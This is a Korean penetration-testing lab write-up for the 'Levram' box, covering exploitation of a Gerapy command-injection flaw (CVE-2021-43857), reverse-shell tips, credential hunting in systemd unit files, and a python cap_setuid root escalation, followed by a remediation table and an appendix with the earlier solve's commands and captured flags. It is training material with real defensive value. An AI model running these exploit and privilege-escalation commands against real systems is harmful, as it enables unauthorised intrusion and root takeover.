4. **공개 익스플로잇이 죽으면 스크립트를 읽어라.** EDB 50640은 "프로젝트가 최소 1개 존재"를 암묵적 전제로 깔고 있어서 깨끗한 박스에서 `IndexError`로 터진다. 에러 메시지만 보고 "타겟이 안 취약하다"고 결론내면 박스를 놓친다. **스크립트가 뭘 가정하는지 확인하고 그 전제를 직접 만들어준다.** 예외가 로컬 트레이스백이면 타겟은 무죄다.
5. **명령주입 페이로드는 `` `/bin/bash -c '...'` `` 로 감싼다.** `shell=True`는 `/bin/sh`(Ubuntu에서는 dash)를 쓰고, dash에는 `/dev/tcp`도 `>&`도 없다. 이 한 겹을 빼먹으면 **에러도 없이 조용히 실패**한다.
6. **주입 지점이 인자 위치면 `;`보다 백틱/`$()`.** 뒤에 남은 인자들이 문법을 깨뜨리지 않는다. `;`이 안 통했다고 포기하지 말 것.
7. **`getcap -r / 2>/dev/null`은 리눅스 privesc 반사 동작.** `ping`의 `cap_net_raw` 같은 정상 항목이 섞여 나오므로 **비정상만 골라내는 눈**이 필요하다 — 인터프리터(`python`, `perl`, `ruby`)나 `tar`·`gdb`에 붙은 capability가 그것이다. 판별 규칙: **`cap_net_*` 는 노이즈, 그 외는 후보. 대상이 인터프리터면 무조건 후보.**
8. **capability는 정확히 부여된 것만 쓸 수 있다.** `cap_setuid`만 있으면 `os.setgid(0)`은 `EPERM`이다. GTFOBins 원문을 임의로 "보강"하지 말 것.
9. **`/etc/systemd/system/`은 크리덴셜 창고다.** world-readable이 기본이고 관리자가 주석에 비밀번호를 적어두는 일이 흔하다. `cat /etc/systemd/system/*.service`, `systemctl cat <서비스>`, `grep -rIn -iE 'pass|secret|token' /etc/systemd/`를 열거 체크리스트에 넣는다. 유닛 파일에서는 `User=`(비면 root)·`ExecStart=`(쓰기 가능한 스크립트)·주석 순으로 읽는다.
10. **권한상승 경로가 둘이면 둘 다 확인하되, 선택은 "재접속 비용"으로 한다.** capability 경로는 `gid`가 남는 반쪽 root였고, 비밀번호 경로는 완전한 root + SSH 재접속까지 줬다. **시험에서는 "안정적인 발판"이 되는 쪽을 택한다.**
11. **`su`는 pty를 요구한다.** 리버스셸에서 곧바로 치면 실패한다. 자격증명을 얻었으면 TTY 업그레이드가 먼저다.

### 7-3. 시간 배분 요약

- **총 예산 감각**: Fundamental 난이도 박스는 **60~90분**이 적정선이다. 이 박스에서 그 예산을 초과시킬 위험은 오직 하나, **버전 정밀 판정**이다.
- **손절 규칙 3개**
  1. 기본 자격증명은 **5개 시도, 1분** — 안 되면 다른 벡터로
  2. 공개 익스플로잇 디버깅은 **10분** — 넘기면 `curl` 수동 재구성
  3. 버전 판정은 **"패치 경계 판별"까지만** — 정밀 대조는 익스플로잇이 실패한 뒤에
- **셸을 잡은 뒤 privesc는 6줄 열거 안에 끝난다.** 여기서 30분을 쓰고 있다면 열거를 안 한 것이다.

---

## 8. 방어 관점

| 결함 | 위치 | 조치 |
|---|---|---|
| **운영 환경에 개발 서버** | `manage.py runserver` (`WSGIServer 0.2` 배너) | gunicorn/uWSGI + nginx 뒤로. 개발 서버는 단일 스레드라 보안 이전에 가용성 문제다 |
| **`DEBUG = True`** | Django `settings.py` | `DEBUG = False` + `ALLOWED_HOSTS` 명시 + 커스텀 `handler404`/`handler500`. **이 하나만 고쳤어도 공격자가 `parse` 엔드포인트를 못 찾았을 가능성이 높다** |
| **기본 자격증명 `admin:admin`** | Gerapy 사용자 DB | 최초 기동 시 강제 변경. 기본 계정 유지 시 부팅 거부 |
| **명령주입 (CVE-2021-43857)** | `spider` → `shell=True` | **0.9.8 이상으로 업그레이드.** 근본 대책은 `shell=False` + 리스트 인자 + 스파이더 이름 화이트리스트 |
| **인증 API에 레이트리밋 없음** | `/api/user/auth` | DRF `throttling` 적용. 기본 자격증명이 아니어도 브루트포스가 열려 있었다 |
| **인터프리터에 `cap_setuid`** | `/usr/bin/python3.10` | `setcap -r /usr/bin/python3.10`. 특정 권한이 필요하면 **전용 헬퍼 바이너리**에만 최소 capability를 부여한다. 인터프리터에 붙이면 임의 코드 실행 권한을 준 것과 같다 |
| **유닛 파일 주석에 평문 root 비밀번호** | `/etc/systemd/system/app.service` | 즉시 비밀번호 회전 + 주석 삭제. 자격증명은 `EnvironmentFile=`(0600, root 전용) 또는 `systemd-creds`/시크릿 매니저로 |
| 유닛 파일 권한 | 동일 | 자격증명을 담는 파일은 `chmod 600`. 기본 0644는 **모든 로컬 사용자가 읽는다** |
| **root SSH 비밀번호 로그인 허용** | `/etc/ssh/sshd_config` | `PermitRootLogin prohibit-password` 또는 `no`. 비밀번호가 유출돼도 원격 재진입을 막는다 |
| 서비스 격리 부족 | `app.service` | `ProtectSystem=strict`·`PrivateTmp=yes`·`NoNewPrivileges=yes`. **`NoNewPrivileges=yes` 하나로 capability 권한상승(경로 A)이 차단된다** |
| 아웃바운드 무제한 | 네트워크 | egress 필터링. 리버스셸이 4444로 그대로 나갔다 |

---

## 9. 참고 자료

- **CVE-2021-43857** — Gerapy < 0.9.8 인증 후 원격 명령 실행 (`/api/project/<name>/parse` 의 `spider`)
  - https://nvd.nist.gov/vuln/detail/CVE-2021-43857
  - GitHub Advisory: `GHSA-cpwx-vrp4-4pq7`
- **Exploit-DB 50640** — Gerapy 0.9.7 RCE PoC. **프로젝트가 최소 1개 존재해야 동작** (`searchsploit -m 50640`)
- **GTFOBins — Capabilities / `python`**: https://gtfobins.github.io/gtfobins/python/#capabilities
- **`capabilities(7)`** — 전체 capability 목록과 `permitted`/`effective`/`inheritable` 규칙: `man 7 capabilities`
- **`setcap(8)` / `getcap(8)`** — 부여·조회. `=ep` 표기의 의미
- **Django — `DEBUG` 설정과 `technical_404_response`**: https://docs.djangoproject.com/en/4.2/ref/settings/#debug
- **Django `APPEND_SLASH`** — 트레일링 슬래시 리다이렉트가 판별자를 가리는 이유: https://docs.djangoproject.com/en/4.2/ref/settings/#append-slash
- **Django REST Framework — `TokenAuthentication`** (`Authorization: Token <키>`): https://www.django-rest-framework.org/api-guide/authentication/#tokenauthentication
- **Python `subprocess` — Security Considerations** (`shell=True` 경고): https://docs.python.org/3/library/subprocess.html#security-considerations
- **systemd `NoNewPrivileges=`** — capability 기반 권한상승 차단: `man 5 systemd.exec`
- **PyPI Gerapy 릴리스 목록** (버전 대조용 sdist/wheel): https://pypi.org/project/gerapy/#history

## 남긴 흔적 (랩 정리용)

Gerapy에 프로젝트 `pwn`(id 1) 생성됨. 지우려면 `POST /api/project/pwn/remove`. 랩 Stop/Revert 시 소멸.
`/root/email3.txt`(8바이트)가 있으나 플래그와 무관해 열지 않았다.

## 관련 노트

- [[_WRITEUP-STANDARD]] — 이 노트의 작성 기준
- [[Hub]] — **버전 판정을 같은 출처 근거 3개로 하다 틀린 사례.** 이 박스의 방법론이 나온 배경
- [[RubyDome]] · [[Astronaut]] — 같은 "버전 판정은 독립 근거 2개" 패턴
- [[Hawat]] — 인용 중첩을 hex 리터럴로 회피 · `python3` 없는 환경의 TTY 업그레이드 · 서비스가 root로 구동되는 패턴
- [[Exfiltrated]] — 인용 중첩을 base64로 회피
- [[01. Pentest Foundations]] — Levram 항목
- [[Crane]] · [[Hub]] — 같은 컬렉션 앞 박스

---

## 부록 A — 이전 세션 기록 (2026-06-26, 다른 랩 인스턴스)


> [!note] 이 절은 원본 노트의 보존본이다
> 이 박스를 **2026-06-26에 한 번 풀었던 기록**이다(타겟 IP `192.168.161.24`, 당시 상태 `solved`).
> 랩이 재기동되면 IP·타임스탬프·업로드 경로가 바뀌므로 본문(최신 세션)과 값이 다르다.
> **같은 박스를 다른 시점에 두 번 푼 기록이라 대조 자료로 가치가 있다** — 특히 랩 인스턴스마다 무엇이 바뀌고 무엇이 그대로인지 확인할 수 있다.

## Nmap

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ nnmap 192.168.161.24
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-26 14:13 +0900
Nmap scan report for 192.168.161.24
Host is up (0.067s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
8000/tcp open  http    WSGIServer 0.2 (Python 3.10.6)
|_http-server-header: WSGIServer/0.2 CPython/3.10.6
|_http-title: Gerapy
|_http-cors: GET POST PUT DELETE OPTIONS PATCH
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   65.47 ms 192.168.45.1
2   65.43 ms 192.168.45.254
3   65.53 ms 192.168.251.1
4   65.62 ms 192.168.161.24

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.11 seconds
```

8000 포트 접근 후 로그인 시도`admin/admin`
![[Pasted image 20260626142047.png]]

로그인 성공 후 gerapy v0.9.7 확인
![[Pasted image 20260629092125.png]]

CVE 검색
![[Pasted image 20260629092156.png]]

RCE 취약점 발견 

![[Pasted image 20260629092221.png]]

payload 검색
![[Pasted image 20260629092234.png]]


payload 다운로드
```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ git clone https://github.com/LongWayHomie/CVE-2021-43857.git
Cloning into 'CVE-2021-43857'...
remote: Enumerating objects: 10, done.
remote: Counting objects: 100% (10/10), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 10 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (10/10), 124.07 KiB | 20.68 MiB/s, done.
Resolving deltas: 100% (1/1), done.
```
![[Pasted image 20260629092306.png]]


payload 실행 후 `app` 계정 접근
```bash
┌──(kali㉿kali)-[~/PG/Levram/CVE-2021-43857]
└─$ python cve-2021-43857.py -t 192.168.132.24 -p 8000 -L 192.168.45.156 -P 4444
  ______     _______     ____   ___ ____  _       _  _  _____  ___ ____ _____
 / ___\ \   / / ____|   |___ \ / _ \___ \/ |     | || ||___ / ( _ ) ___|___  |
| |    \ \ / /|  _| _____ __) | | | |__) | |_____| || |_ |_ \ / _ \___ \  / /
| |___  \ V / | |__|_____/ __/| |_| / __/| |_____|__   _|__) | (_) |__) |/ /
 \____|  \_/  |_____|   |_____|\___/_____|_|        |_||____/ \___/____//_/


Exploit for CVE-2021-43857
For: Gerapy < 0.9.8
[*] Resolving URL...
[*] Logging in to application...
[*] Login successful! Proceeding...
[*] Getting the project list
[*] Found project: 4leaf
[*] Getting the ID of the project to build the URL
[*] Found ID of the project:  1
[*] Setting up a netcat listener
listening on [any] 4444 ...
[*] Executing reverse shell payload
[*] Watchout for shell! :)
connect to [192.168.45.156] from (UNKNOWN) [192.168.132.24] 53596
bash: cannot set terminal process group (846): Inappropriate ioctl for device
bash: no job control in this shell
app@ubuntu:~/gerapy$ whoami
whoami
app
app@ubuntu:~/gerapy$
```

local.txt 획득
```bash
app@ubuntu:~$ cat local.txt
cat local.txt
6fb5bd58ccdadc78eb9299e4a6dccc25
app@ubuntu:~$ ifconfig
ifconfig
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.132.24  netmask 255.255.255.0  broadcast 192.168.132.255
        ether 00:50:56:ab:d2:c7  txqueuelen 1000  (Ethernet)
        RX packets 1541  bytes 153139 (153.1 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1282  bytes 3613201 (3.6 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 392  bytes 31600 (31.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 392  bytes 31600 (31.6 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

![[Pasted image 20260629092633.png]]


linpeas.sh 실행하여 python 취약점 발견
![[Pasted image 20260629102405.png]]


root 획득 후 flag 확인

```bash
app@ubuntu:~/gerapy$ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
<c 'import os; os.setuid(0); os.system("/bin/bash")'
root@ubuntu:~/gerapy# whoami
whoami
root
root@ubuntu:~/gerapy# cat /root/proof.txt
cat /root/proof.txt
ed363800340058da6500e35c1150c446
```
![[Pasted image 20260629102311.png]]
